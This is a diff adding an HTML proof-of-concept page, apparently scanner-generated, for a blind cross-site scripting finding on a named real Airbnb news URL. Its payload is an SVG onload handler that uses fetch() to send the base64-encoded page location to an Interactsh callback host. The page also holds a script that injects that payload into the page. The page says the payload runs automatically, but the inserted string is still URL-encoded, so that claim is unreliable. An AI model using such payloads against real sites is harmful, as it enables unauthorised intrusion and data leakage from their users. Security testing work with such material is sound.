@@ -1,0 +1,66 @@
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>XSS Proof of Concept - Blind XSS (Callback)</title>
+        <style>
+            body { font-family: Arial, sans-serif; background-color: #f0f2f5; color: #333; margin: 20px; }
+            .container { background-color: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 800px; margin: 20px auto; }
+            h1 { color: #d63384; }
+            h2 { color: #007bff; }
+            pre { background-color: #e9ecef; padding: 15px; border-radius: 5px; overflow-x: auto; }
+            code { color: #c42f2f; }
+            .info { background-color: #e6f7ff; border-left: 5px solid #2196f3; padding: 10px; margin-bottom: 20px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>XSS Vulnerability Proof of Concept</h1>
+            <div class="info">
+                <p>This file demonstrates a detected Cross-Site Scripting (XSS) vulnerability.</p>
+                <p><strong>Note:</strong> The payload will execute automatically when this file is opened in a browser.</p>
+            </div>
+
+            <h2>Vulnerability Details</h2>
+            <p><strong>Vulnerable URL:</strong> <a href="https://news.airbnb.com/ea/" target="_blank">https://news.airbnb.com/ea/</a></p>
+            <p><strong>HTTP Method:</strong> GET</p>
+            <p><strong>Detected XSS Type:</strong> Blind XSS (Callback)</p>
+            <p><strong>Injected Payload:</strong></p>
+            <pre><code>%3Csvg/onload%3Dfetch%28%27//99o5acu1yd5e.oast.pro/svg%3Floc%3D%27%2Bbtoa%28window.location%29%29%3E</code></pre>
+
+            <h2>Attack Reconstruction</h2>
+            <p>Open this page to see the payload in action. This is a direct simulation of the injection.</p>
+            <p>To reproduce:</p>
+            <ul>
+                <li>Navigate to the vulnerable URL.</li>
+                <li>If the method is GET, the payload is directly in the URL.</li>
+                <li>If the method is POST, the payload was submitted via a form.</li>
+            </ul>
+
+            <h2>Active Payload (for demonstration)</h2>
+            <p>The following code simulates the injection of the payload into the page. If the target environment is vulnerable, execution will occur.</p>
+            <pre><code>
+    <!-- The injected payload will be executed here. The exact content depends on the injection context. -->
+    <!-- For a Reflected/DOM XSS, the browser will execute this code. -->
+    <!-- For a Blind XSS, an interaction with the Interactsh callback server would have occurred. -->
+
+    %3Csvg/onload%3Dfetch%28%27//99o5acu1yd5e.oast.pro/svg%3Floc%3D%27%2Bbtoa%28window.location%29%29%3E
+
+    <script>
+        // This is a PoC script. The XSS payload above is the actual injection point.
+        // This part just ensures the payload is displayed and potentially executed
+        // in the context of this PoC file.
+        console.log("PoC loaded. Check the console or network tab for signs of XSS payload execution.");
+        try {
+            const testDiv = document.createElement('div');
+            testDiv.innerHTML = `%3Csvg/onload%3Dfetch%28%27//99o5acu1yd5e.oast.pro/svg%3Floc%3D%27%2Bbtoa%28window.location%29%29%3E`;
+            document.body.appendChild(testDiv);
+        } catch (e) {
+            console.error("Error inserting payload into PoC:", e);
+        }
+    </script>
+            </code></pre>
+        </div>
+    </body>
+    </html>
+    
